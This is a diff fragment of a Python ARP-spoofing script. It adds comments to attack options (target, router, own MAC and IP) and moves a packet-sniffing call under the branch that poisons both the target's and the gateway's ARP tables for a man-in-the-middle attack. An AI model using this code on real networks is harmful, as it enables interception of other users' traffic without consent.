@@ -8,14 +8,14 @@ import subprocess
 
 rep = False 
 options = {
-        "interface" :conf.iface,
-        "delay" : 3 , 
-        "attackGW" : None , 
-        "target" : "127.0.0.1",
-        "src": None , 
-        "router" : None , 
-        "mac ":None , 
-        "ip" : None
+        "interface" :conf.iface,#which interface should it use
+        "delay" : 3 , #delayed or not
+        "attackGW" : None , #full or half duplex 
+        "target" : "127.0.0.1",#attack target 
+        "src": None , #attack source
+        "router" : None , #my router
+        "mac ":None , #my mac
+        "ip" : None #my ip 
     } 
 
 def main(argv :list )->None:
@@ -69,10 +69,11 @@ def main(argv :list )->None:
     arpUtil.changeArpTable(options["target"], source  ,options["mac"], options["interface"] )
     if(options["attackGW"]):
         arpUtil.changeArpTable(options["router"] ,options["target"] , options["mac"],options["interface"] )
-    sniff(
-        lfilter= lambda x : IP in x and (x[IP].dst != options["ip"] or x[IP].src != options["ip"]) , prn = lambda x : x.show() 
+        sniff(
+            lfilter= lambda x : IP in x and (x[IP].dst != options["ip"] or x[IP].src != options["ip"]) 
+            , prn = lambda x : x.show() 
         
-    )
+        ) #MITM if there is 
 if __name__ == "__main__":
     
     batcmd="sysctl net.ipv4.ip_forward"
